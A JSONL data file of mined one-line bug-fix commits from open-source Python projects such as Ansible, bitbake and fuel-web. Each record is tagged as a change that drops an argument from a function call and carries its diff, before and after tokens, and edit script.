{"project": "ansible-1", "commit_sha": "4a1d37a76b26ab1bac5c48b4a33a4b895485625f", "parent_sha": "119376a685fe7b8b18ed21a1de0e8a82335ceef7", "file_path": "lib/ansible/modules/network/nxos/nxos_logging.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -395,7 +395,7 @@ def main():\n     want = map_params_to_obj(module)\n     have = map_config_to_obj(module)\n \n-    commands = map_obj_to_commands((want, have), module)\n+    commands = map_obj_to_commands((want, have))\n     result['commands'] = commands\n \n     if commands:\n", "before": "commands = map_obj_to_commands ( ( want , have ) , module )", "after": "commands = map_obj_to_commands ( ( want , have ) )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 48, 3, 49]], [\"Delete\", [\"identifier:module\", 3, 50, 3, 56]]]"}
{"project": "ansible-modules-core", "commit_sha": "64b104ac37d170c83050326ed63899a00100709f", "parent_sha": "92bf802cb82844783a2b678b0e709bdd82c1103d", "file_path": "cloud/docker/docker_service.py", "project_url": "https://github.com/drewp/ansible-modules-core", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -434,7 +434,7 @@ class ContainerManager(DockerBaseClass):\n \n     def __init__(self, client):\n \n-        super(ContainerManager, self).__init__(module=client.module)\n+        super(ContainerManager, self).__init__()\n \n         self.client = client\n         self.project_src = None\n", "before": "super ( ContainerManager , self ) . __init__ ( module = client . module )", "after": "super ( ContainerManager , self ) . __init__ ( )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"identifier:module\", 3, 48, 3, 54]], [\"Delete\", [\"=:=\", 3, 54, 3, 55]], [\"Delete\", [\"identifier:client\", 3, 55, 3, 61]], [\"Delete\", [\".:.\", 3, 61, 3, 62]], [\"Delete\", [\"identifier:module\", 3, 62, 3, 68]], [\"Delete\", [\"attribute\", 3, 55, 3, 68]], [\"Delete\", [\"keyword_argument\", 3, 48, 3, 68]]]"}
{"project": "pritunl", "commit_sha": "53e579f13ee0584ca24af8a3e60d3c330671ffd3", "parent_sha": "ce455816e3ddd74b9238a860acf00d9a8b76ca36", "file_path": "pritunl/logger/formatter.py", "project_url": "https://github.com/security-geeks/pritunl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -70,7 +70,7 @@ class LogFormatter(logging.Formatter):\n \n             plugins.event(\n                 'log_entry',\n-                **kwargs,\n+                **kwargs\n             )\n         except:\n             from pritunl import logger\n", "before": "plugins . event ( 'log_entry' , ** kwargs , )", "after": "plugins . event ( 'log_entry' , ** kwargs )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 25, 3, 26]]]"}
{"project": "mopidy", "commit_sha": "ce2c032247ddde72df52f3385c0120f25f12f622", "parent_sha": "62684af5185356a24247d18deea9451f1ac3991b", "file_path": "mopidy/backends/gstreamer.py", "project_url": "https://github.com/atxwebs/mopidy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -121,7 +121,7 @@ class GStreamerPlaybackController(BasePlaybackController):\n \n         bus.disconnect(self._bus_id)\n         bus.remove_signal_watch()\n-        bin.get_state(-1)\n+        bin.get_state()\n         bin.set_state(gst.STATE_NULL)\n \n         del bus\n", "before": "bin . get_state ( - 1 )", "after": "bin . get_state ( )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"-:-\", 3, 23, 3, 24]], [\"Delete\", [\"integer:1\", 3, 24, 3, 25]], [\"Delete\", [\"unary_operator\", 3, 23, 3, 25]]]"}
{"project": "fuel-web", "commit_sha": "ab06e8852dae7e27f925fa63562c21054cf4c414", "parent_sha": "9841ba7bcbfca372c9d86cf3f9ec8c44cce770ae", "file_path": "nailgun/nailgun/api/handlers/node.py", "project_url": "https://github.com/ytyanghm/fuel-web", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -517,7 +517,7 @@ class NodeNICsDefaultHandler(JSONHandler):\n                     {'id': ng.id, 'name': ng.name})\n \n             allowed_ngs = network_manager.get_allowed_nic_networkgroups(\n-                node, nic)\n+                node)\n \n             for ng in allowed_ngs:\n                 nic_dict.setdefault('allowed_networks', []).append(\n", "before": "allowed_ngs = network_manager . get_allowed_nic_networkgroups ( node , nic )", "after": "allowed_ngs = network_manager . get_allowed_nic_networkgroups ( node )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 21, 3, 22]], [\"Delete\", [\"identifier:nic\", 3, 23, 3, 26]]]"}
{"project": "fuel-web", "commit_sha": "80263d484ae55178aab8c1cf0fd7d0800e936d12", "parent_sha": "d210de6d783328b779aa7a628544dfdc2cde03df", "file_path": "nailgun/nailgun/test/test_task_managers.py", "project_url": "https://github.com/ytyanghm/fuel-web", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -619,7 +619,7 @@ class TestTaskManagers(BaseHandlers):\n     def test_download_release(self):\n         release = self.env.create_release()\n         self.assertEquals(release.state, 'not_available')\n-        task = self.env.download_release(release.id, True)\n+        task = self.env.download_release(release.id)\n         release = self.db.query(Release).get(release.id)\n         self.assertEquals(release.state, 'downloading')\n         self.env.wait_ready(task, timeout=5)\n", "before": "task = self . env . download_release ( release . id , True )", "after": "task = self . env . download_release ( release . id )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 52, 3, 53]], [\"Delete\", [\"true:True\", 3, 54, 3, 58]]]"}
{"project": "fuel-web", "commit_sha": "99d94985d2af8486f49370d03df4e02823347035", "parent_sha": "05d4f2c4d92c288bc69d4e84013b9ff94a8ea055", "file_path": "nailgun/nailgun/task/task.py", "project_url": "https://github.com/ytyanghm/fuel-web", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -578,4 +578,4 @@ class CheckNetworksTask(object):\n             orm().add(task)\n             orm().commit()\n             full_err_msg = \"\\n\".join(err_msgs)\n-            raise errors.NetworkCheckError(full_err_msg, log_traceback=True)\n+            raise errors.NetworkCheckError(full_err_msg)\n", "before": "raise errors . NetworkCheckError ( full_err_msg , log_traceback = True )", "after": "raise errors . NetworkCheckError ( full_err_msg )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 56, 3, 57]], [\"Delete\", [\"identifier:log_traceback\", 3, 58, 3, 71]], [\"Delete\", [\"=:=\", 3, 71, 3, 72]], [\"Delete\", [\"true:True\", 3, 72, 3, 76]], [\"Delete\", [\"keyword_argument\", 3, 58, 3, 76]]]"}
{"project": "ansible-1", "commit_sha": "4b4bcdedc11f1f66cf0a6a366cecf5b73c3c55a7", "parent_sha": "1ae018ce941fa5535fe1032d81284b469d64862d", "file_path": "lib/ansible/playbook/__init__.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -312,7 +312,7 @@ class PlayBook(object):\n             # do N forks all the way through before moving to next\n             while len(all_hosts) > 0:\n                 play_hosts = []\n-                for x in range(1, play.serial):\n+                for x in range(play.serial):\n                     if len(all_hosts) > 0:\n                         play_hosts.append(all_hosts.pop())\n                 serialized_batch.append(play_hosts)                        \n", "before": "for x in range ( 1 , play . serial ) : if len ( all_hosts ) > 0 : play_hosts . append ( all_hosts . pop ( ) )", "after": "for x in range ( play . serial ) : if len ( all_hosts ) > 0 : play_hosts . append ( all_hosts . pop ( ) )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"integer:1\", 3, 32, 3, 33]], [\"Delete\", [\",:,\", 3, 33, 3, 34]]]"}
{"project": "ansible-1", "commit_sha": "ce349b6c3d2a985e74afd9f727eb44ea9a53675f", "parent_sha": "11a68b4cad49727a137e2d2fc06ccf036b66e2db", "file_path": "lib/ansible/modules/extras/network/haproxy.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -243,7 +243,7 @@ def main():\n     if not socket:\n         module.fail_json(msg=\"unable to locate haproxy socket\")\n \n-    ansible_haproxy = HAProxy(module, **module.params)\n+    ansible_haproxy = HAProxy(module)\n     ansible_haproxy.act()\n \n # import module snippets\n", "before": "ansible_haproxy = HAProxy ( module , ** module . params )", "after": "ansible_haproxy = HAProxy ( module )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 37, 3, 38]], [\"Delete\", [\"**:**\", 3, 39, 3, 41]], [\"Delete\", [\"identifier:module\", 3, 41, 3, 47]], [\"Delete\", [\".:.\", 3, 47, 3, 48]], [\"Delete\", [\"identifier:params\", 3, 48, 3, 54]], [\"Delete\", [\"attribute\", 3, 41, 3, 54]], [\"Delete\", [\"dictionary_splat\", 3, 39, 3, 54]]]"}
{"project": "ansible-1", "commit_sha": "8a6237955d26ef72a149d85e882ad840b7c66710", "parent_sha": "cca89ef489370c15c38400ea18f9cda8b49a183e", "file_path": "lib/ansible/modules/cloud/docker/docker_service.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -434,7 +434,7 @@ class ContainerManager(DockerBaseClass):\n \n     def __init__(self, client):\n \n-        super(ContainerManager, self).__init__(module=client.module)\n+        super(ContainerManager, self).__init__()\n \n         self.client = client\n         self.project_src = None\n", "before": "super ( ContainerManager , self ) . __init__ ( module = client . module )", "after": "super ( ContainerManager , self ) . __init__ ( )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"identifier:module\", 3, 48, 3, 54]], [\"Delete\", [\"=:=\", 3, 54, 3, 55]], [\"Delete\", [\"identifier:client\", 3, 55, 3, 61]], [\"Delete\", [\".:.\", 3, 61, 3, 62]], [\"Delete\", [\"identifier:module\", 3, 62, 3, 68]], [\"Delete\", [\"attribute\", 3, 55, 3, 68]], [\"Delete\", [\"keyword_argument\", 3, 48, 3, 68]]]"}
{"project": "Zambez-AI", "commit_sha": "784866fd31979b92691041fc5e876b6bcf65be56", "parent_sha": "18416d26fe0a7ffccd1c18d011f4ee3110093b04", "file_path": "src/botApps/Thanks.py", "project_url": "https://github.com/jbialon32/Zambez-AI", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -10,7 +10,7 @@ def Thanks(bot):\n     @bot.command(pass_context=True)\n     async def thanks(ctx):\n         thanksFile = open(\"data/numThanks.txt\", \"r\")\n-        numThanks = int(thanksFile.readline(1))\n+        numThanks = int(thanksFile.readline())\n         thanksFile.close()\n         \n         numThanks += 1\n", "before": "numThanks = int ( thanksFile . readline ( 1 ) )", "after": "numThanks = int ( thanksFile . readline ( ) )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"integer:1\", 3, 45, 3, 46]]]"}
{"project": "ansible-1", "commit_sha": "3f4dfb25742001b937fad03b0176e34a15201498", "parent_sha": "e9e316c76bb85b417e7705da1f3a9a82c6bb2b65", "file_path": "lib/ansible/plugins/connection/winrm.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -393,7 +393,7 @@ class Connection(ConnectionBase):\n \n             except Exception as ex:\n                 from traceback import format_exc\n-                display.warning(\"FATAL ERROR DURING FILE TRANSFER: %s\" % format_exc(ex))\n+                display.warning(\"FATAL ERROR DURING FILE TRANSFER: %s\" % format_exc())\n                 stdin_push_failed = True\n \n             if stdin_push_failed:\n", "before": "display . warning ( \"FATAL ERROR DURING FILE TRANSFER: %s\" % format_exc ( ex ) )", "after": "display . warning ( \"FATAL ERROR DURING FILE TRANSFER: %s\" % format_exc ( ) )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"identifier:ex\", 3, 85, 3, 87]]]"}
{"project": "pysmurf", "commit_sha": "63a9556056a32fe66d9bbd8b54d32f3c9222df8b", "parent_sha": "14cb3b064c8d225120d28497af8ebb0bafd708ff", "file_path": "command/smurf_command.py", "project_url": "https://github.com/eyyoung24/pysmurf", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -986,7 +986,7 @@ class SmurfCommandMixin(SmurfBase):\n         \"\"\"\n         \"\"\"\n         return self._caget(self._channel_root(band, channel) +\n-            self._frequency_error_mhz, val, **kwargs)\n+            self._frequency_error_mhz, **kwargs)\n \n \n     # Attenuator\n", "before": "return self . _caget ( self . _channel_root ( band , channel ) + self . _frequency_error_mhz , val , ** kwargs )", "after": "return self . _caget ( self . _channel_root ( band , channel ) + self . _frequency_error_mhz , ** kwargs )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"identifier:val\", 3, 40, 3, 43]], [\"Delete\", [\",:,\", 3, 43, 3, 44]]]"}
{"project": "ansible-1", "commit_sha": "a8aa5ff4eb7eb6c981f3446be508d6da3b5c7a68", "parent_sha": "cf251258a8b2a1e6befd6e72f4691cf450d70cb2", "file_path": "lib/ansible/plugins/lookup/cartesian.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -50,5 +50,5 @@ class LookupModule(LookupBase):\n         if len(my_list) == 0:\n             raise AnsibleError(\"with_cartesian requires at least one element in each list\")\n \n-        return [self._flatten(x) for x in product(*my_list, fillvalue=None)]\n+        return [self._flatten(x) for x in product(*my_list)]\n \n", "before": "return [ self . _flatten ( x ) for x in product ( * my_list , fillvalue = None ) ]", "after": "return [ self . _flatten ( x ) for x in product ( * my_list ) ]", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 59, 3, 60]], [\"Delete\", [\"identifier:fillvalue\", 3, 61, 3, 70]], [\"Delete\", [\"=:=\", 3, 70, 3, 71]], [\"Delete\", [\"none:None\", 3, 71, 3, 75]], [\"Delete\", [\"keyword_argument\", 3, 61, 3, 75]]]"}
{"project": "mxnet", "commit_sha": "a8e1912b596be69188abdeee6d5b4e40c8ca792e", "parent_sha": "b847c6f28c45514bb9c5495498875cbd6232cc1f", "file_path": "python/mxnet/ndarray/sparse.py", "project_url": "https://github.com/zhiiker/mxnet", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -400,7 +400,7 @@ class CSRNDArray(BaseSparseNDArray):\n                [ 0.,  0.,  0.],\n                [ 0.,  0.,  0.]], dtype=float32)\n         >>> # assign CSRNDArray with same storage type\n-        >>> x = mx.nd.ones('row_sparse', (3,3)).tostype('csr')\n+        >>> x = mx.nd.ones((3,3)).tostype('csr')\n         >>> x[:] = src\n         >>> x.asnumpy()\n         array([[ 1.,  1.,  1.],\n", "before": "[ 0. , 0. , 0. ] ] , dtype = float32 ) >> > >> > x = mx . nd . ones ( 'row_sparse' , ( 3 , 3 ) ) . tostype ( 'csr' )", "after": "[ 0. , 0. , 0. ] ] , dtype = float32 ) >> > >> > x = mx . nd . ones ( ( 3 , 3 ) ) . tostype ( 'csr' )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"string:'row_sparse'\", 3, 28, 3, 40]], [\"Delete\", [\",:,\", 3, 40, 3, 41]]]"}
{"project": "bitbake", "commit_sha": "9f171ea755644ecd9d2b3d7ed13bf8ec09ec917a", "parent_sha": "d753644c67d163f338f2bdc3d600203e8b1a5734", "file_path": "lib/bb/data_smart.py", "project_url": "https://github.com/YoeDistro/bitbake", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -618,7 +618,7 @@ class DataSmart(MutableMapping):\n         if value and flag == \"_content\" and local_var is not None and \"_removeactive\" in local_var:\n             removes = [self.expand(r) for r in local_var[\"_removeactive\"]]\n             filtered = filter(lambda v: v not in removes,\n-                              value.split(\" \"))\n+                              value.split())\n             value = \" \".join(filtered)\n             if expand:\n                  # We need to ensure the expand cache has the correct value\n", "before": "filtered = filter ( lambda v : v not in removes , value . split ( \" \" ) )", "after": "filtered = filter ( lambda v : v not in removes , value . split ( ) )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"string:\\\" \\\"\", 3, 43, 3, 46]]]"}
{"project": "bitbake", "commit_sha": "10a47b1ec7470c9e8c4ffe0bb35cdf6d1bb2ee2e", "parent_sha": "16d5f40ad20fd08bf7a4d0e36200c739b5a9f59e", "file_path": "lib/bb/fetch2/wget.py", "project_url": "https://github.com/YoeDistro/bitbake", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -174,7 +174,7 @@ class Wget(FetchMethod):\n         \"\"\"\n         Run fetch checkstatus to get directory information\n         \"\"\"\n-        f = tempfile.NamedTemporaryFile(dir=\"/tmp/s/\", delete=False)\n+        f = tempfile.NamedTemporaryFile()\n \n         agent = \"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.12) Gecko/20101027 Ubuntu/9.10 (karmic) Firefox/3.6.12\"\n", "before": "f = tempfile . NamedTemporaryFile ( dir = \"/tmp/s/\" , delete = False )", "after": "f = tempfile . NamedTemporaryFile ( )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"identifier:dir\", 3, 41, 3, 44]], [\"Delete\", [\"=:=\", 3, 44, 3, 45]], [\"Delete\", [\"string:\\\"/tmp/s/\\\"\", 3, 45, 3, 54]], [\"Delete\", [\"keyword_argument\", 3, 41, 3, 54]], [\"Delete\", [\",:,\", 3, 54, 3, 55]], [\"Delete\", [\"identifier:delete\", 3, 56, 3, 62]], [\"Delete\", [\"=:=\", 3, 62, 3, 63]], [\"Delete\", [\"false:False\", 3, 63, 3, 68]], [\"Delete\", [\"keyword_argument\", 3, 56, 3, 68]]]"}
{"project": "conda-build", "commit_sha": "eef13cbc24c76872fb94dc17d1348dab81e17d0e", "parent_sha": "95ed58f2e116afe60c2c2961e975fbccd42b0972", "file_path": "conda_build/utils.py", "project_url": "https://github.com/bgruening/conda-build", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -346,7 +346,7 @@ def path2url(path):\n \n def get_stdlib_dir(prefix):\n     if sys.platform == 'win32':\n-        stdlib_dir = os.path.join(prefix, 'Lib', 'site-packages')\n+        stdlib_dir = os.path.join(prefix, 'Lib')\n     else:\n         lib_dir = os.path.join(prefix, 'lib')\n         stdlib_dir = glob(os.path.join(lib_dir, 'python[0-9\\.]*'))\n", "before": "stdlib_dir = os . path . join ( prefix , 'Lib' , 'site-packages' )", "after": "stdlib_dir = os . path . join ( prefix , 'Lib' )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 48, 3, 49]], [\"Delete\", [\"string:'site-packages'\", 3, 50, 3, 65]]]"}
{"project": "bitbake", "commit_sha": "55ba889ef8900c95447861fa3985ca9cfe06afdf", "parent_sha": "805fb2a9388c728600596e9b845a5c7eeaebd99c", "file_path": "lib/toaster/orm/models.py", "project_url": "https://github.com/YoeDistro/bitbake", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -229,7 +229,7 @@ class Project(models.Model):\n         \"\"\" Returns QuerySet of all Machines which are provided by the\n         Layers currently added to the Project \"\"\"\n         queryset = Machine.objects.filter(\n-            layer_version__in=self.get_project_layer_versions(self))\n+            layer_version__in=self.get_project_layer_versions())\n \n         return queryset\n \n", "before": "queryset = Machine . objects . filter ( layer_version__in = self . get_project_layer_versions ( self ) )", "after": "queryset = Machine . objects . filter ( layer_version__in = self . get_project_layer_versions ( ) )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"identifier:self\", 3, 63, 3, 67]]]"}
{"project": "conda-concourse-ci", "commit_sha": "febce07724d00d4eef67b69327796bdb271c6dd9", "parent_sha": "d9a3639b15f871d67496eb6fa0b02b95a60f131d", "file_path": "conda_concourse_ci/execute.py", "project_url": "https://github.com/isuruf/conda-concourse-ci", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -72,7 +72,7 @@ def collect_tasks(path, folders, matrix_base_dir, steps=0, test=False, max_downs\n \n def get_build_task(base_path, graph, node, base_name, commit_id, public=True, artifact_input=False):\n     meta = graph.node[node]['meta']\n-    output_folder = os.path.join('output-artifacts', commit_id)\n+    output_folder = os.path.join('output-artifacts')\n     build_args = ['--no-anaconda-upload', '--output-folder', output_folder,\n                   '-c', os.path.join('rsync-artifacts')]\n     for channel in meta.config.channel_urls:\n", "before": "output_folder = os . path . join ( 'output-artifacts' , commit_id )", "after": "output_folder = os . path . join ( 'output-artifacts' )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 52, 3, 53]], [\"Delete\", [\"identifier:commit_id\", 3, 54, 3, 63]]]"}
{"project": "Volcano", "commit_sha": "64c12df1fcfa1db4c8bc318ac8b13d661b32add7", "parent_sha": "d4cc9f54e7343241e0531142303fc7437258cead", "file_path": "volcapy/train/train_test.py", "project_url": "https://github.com/CedricTravelletti/Volcano", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -40,7 +40,7 @@ def main():\n     \n     # Test-Train split.\n     n_keep = 300\n-    rest_forward, rest_data = inverseProblem.subset_data(self, n_keep, seed=2)\n+    rest_forward, rest_data = inverseProblem.subset_data(n_keep, seed=2)\n     n_data = inverseProblem.n_data\n     F_test = torch.as_tensor(rest_forward).detach()\n     d_obs_test = torch.as_tensor(rest_data[:, None]).detach()\n", "before": "rest_forward , rest_data = inverseProblem . subset_data ( self , n_keep , seed = 2 )", "after": "rest_forward , rest_data = inverseProblem . subset_data ( n_keep , seed = 2 )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"identifier:self\", 3, 58, 3, 62]], [\"Delete\", [\",:,\", 3, 62, 3, 63]]]"}
{"project": "Volcano", "commit_sha": "cb640231277cb9b151bac8862e45a7186fd3e5a3", "parent_sha": "64c12df1fcfa1db4c8bc318ac8b13d661b32add7", "file_path": "volcapy/train/train_test.py", "project_url": "https://github.com/CedricTravelletti/Volcano", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -107,7 +107,7 @@ def main():\n     start = timer()\n     \n     # Create the GP model.\n-    myGP = GaussianProcess(F, d_obs, data_cov, sigma0_init,\n+    myGP = GaussianProcess(F, d_obs, sigma0_init,\n             data_std=data_std, logger=logger)\n     myGP.cuda()\n     \n", "before": "myGP = GaussianProcess ( F , d_obs , data_cov , sigma0_init , data_std = data_std , logger = logger )", "after": "myGP = GaussianProcess ( F , d_obs , sigma0_init , data_std = data_std , logger = logger )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"identifier:data_cov\", 3, 38, 3, 46]], [\"Delete\", [\",:,\", 3, 46, 3, 47]]]"}
{"project": "ScoutSuite", "commit_sha": "6768ac0895b2da8e38ceb7d0585b7a84551e8315", "parent_sha": "8ef2d2ad37e1d85bdcd66a3b343f0e863aa7d89d", "file_path": "AWSScout2/utils.py", "project_url": "https://github.com/agnivesh/ScoutSuite", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -249,7 +249,7 @@ def save_config_to_file(blob, keyword, force_write):\n         pass\n \n def write_data_to_file(f, blob, force_write):\n-    print('%s' % json.dumps(blob, indent=4, separators=(',', ': '), sort_keys=True, cls=Scout2Encoder), file = f)\n+    print('%s' % json.dumps(blob, separators=(',', ': '), sort_keys=True, cls=Scout2Encoder), file = f)\n \n \n ########################################\n", "before": "print ( '%s' % json . dumps ( blob , indent = 4 , separators = ( ',' , ': ' ) , sort_keys = True , cls = Scout2Encoder ) , file = f )", "after": "print ( '%s' % json . dumps ( blob , separators = ( ',' , ': ' ) , sort_keys = True , cls = Scout2Encoder ) , file = f )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"identifier:indent\", 3, 35, 3, 41]], [\"Delete\", [\"=:=\", 3, 41, 3, 42]], [\"Delete\", [\"integer:4\", 3, 42, 3, 43]], [\"Delete\", [\"keyword_argument\", 3, 35, 3, 43]], [\"Delete\", [\",:,\", 3, 43, 3, 44]]]"}
{"project": "remeha_tz", "commit_sha": "eb63b30270517d03e08ef061238f11ad3de5dd0b", "parent_sha": "dca7cf5195479e4d030514295dc59e175aac7c3b", "file_path": "remeha_core.py", "project_url": "https://github.com/TheRikke/remeha_tz", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -54,7 +54,7 @@ class Frame:\n             return\n \n         if self.get_checksum() != struct.unpack(\"<H\", self.frame[-3:-1])[0]:\n-            eprint(\"Checksum incorrect. Should be {:x}, but is {:x}\".format(self.get_checksum(self.frame), struct.unpack(\"<H\", self.frame[-3:-1])[0]))\n+            eprint(\"Checksum incorrect. Should be {:x}, but is {:x}\".format(self.get_checksum(), struct.unpack(\"<H\", self.frame[-3:-1])[0]))\n             return\n \n         self.isValid = True\n", "before": "eprint ( \"Checksum incorrect. Should be {:x}, but is {:x}\" . format ( self . get_checksum ( self . frame ) , struct . unpack ( \"<H\" , self . frame [ - 3 : - 1 ] ) [ 0 ] ) )", "after": "eprint ( \"Checksum incorrect. Should be {:x}, but is {:x}\" . format ( self . get_checksum ( ) , struct . unpack ( \"<H\" , self . frame [ - 3 : - 1 ] ) [ 0 ] ) )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"identifier:self\", 3, 95, 3, 99]], [\"Delete\", [\".:.\", 3, 99, 3, 100]], [\"Delete\", [\"identifier:frame\", 3, 100, 3, 105]], [\"Delete\", [\"attribute\", 3, 95, 3, 105]]]"}
{"project": "plugin-VLC", "commit_sha": "28b1f9bd75b3167864a2eafe75ecd0e01268be32", "parent_sha": "9595c43dc51cae8bd72228855300631e33455bc3", "file_path": "__init__.py", "project_url": "https://github.com/ProjectEG/plugin-VLC", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -336,7 +336,7 @@ class Start(eg.ActionClass):\n         \r\n     def Configure(self, cmdLineArgs=\"\"):\r\n         vlcPath = GetVlcPath()\r\n-        panel = eg.ConfigPanel(self, resizeable=True)\r\n+        panel = eg.ConfigPanel(self)\r\n         cmdLineCtrl = panel.TextCtrl(cmdLineArgs)\r\n         resultCtrl = eg.StaticTextBox(panel)\r\n         def OnTextChange(event=eg.wxDummyEvent):\r\n", "before": "panel = eg . ConfigPanel ( self , resizeable = True )", "after": "panel = eg . ConfigPanel ( self )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 36, 3, 37]], [\"Delete\", [\"identifier:resizeable\", 3, 38, 3, 48]], [\"Delete\", [\"=:=\", 3, 48, 3, 49]], [\"Delete\", [\"true:True\", 3, 49, 3, 53]], [\"Delete\", [\"keyword_argument\", 3, 38, 3, 53]]]"}
{"project": "flair", "commit_sha": "65431aa6fe78b2d0bf6e05d38084ebf063ccf38c", "parent_sha": "9b7252c5dd2232c11476282f478f6ae31de987ef", "file_path": "tests/test_text_classifier_trainer.py", "project_url": "https://github.com/datamics/flair", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -37,7 +37,7 @@ def test_text_classifier_mulit_label():\n     label_dict = corpus.make_label_dictionary()\n \n     glove_embedding: WordEmbeddings = WordEmbeddings('en-glove')\n-    document_embeddings: DocumentMeanEmbeddings = DocumentMeanEmbeddings([glove_embedding], True)\n+    document_embeddings: DocumentMeanEmbeddings = DocumentMeanEmbeddings([glove_embedding])\n \n     model = TextClassifier(document_embeddings, label_dict, True)\n \n", "before": "document_embeddings : DocumentMeanEmbeddings = DocumentMeanEmbeddings ( [ glove_embedding ] , True )", "after": "document_embeddings : DocumentMeanEmbeddings = DocumentMeanEmbeddings ( [ glove_embedding ] )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 91, 3, 92]], [\"Delete\", [\"true:True\", 3, 93, 3, 97]]]"}
{"project": "folia", "commit_sha": "8cd36cd0d73b677d49457f2cd21548c1ae81ed99", "parent_sha": "0669dcf9c24f8e4f2bb4909e267c2338f513223c", "file_path": "schemas/foliaspec.py", "project_url": "https://github.com/MeTavi/folia", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -238,7 +238,7 @@ def outputblock(block, target, varname, indent = \"\"):\n             raise NotImplementedError\n     elif block in spec:\n         #simple variable blocks\n-        outputvar(varname, spec[block], target, True, quote)\n+        outputvar(varname, spec[block], target, True)\n     else:\n         raise Exception(\"No such block exists in foliaspec: \" + block)\n \n", "before": "elif block in spec : outputvar ( varname , spec [ block ] , target , True , quote )", "after": "elif block in spec : outputvar ( varname , spec [ block ] , target , True )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 53, 3, 54]], [\"Delete\", [\"identifier:quote\", 3, 55, 3, 60]]]"}
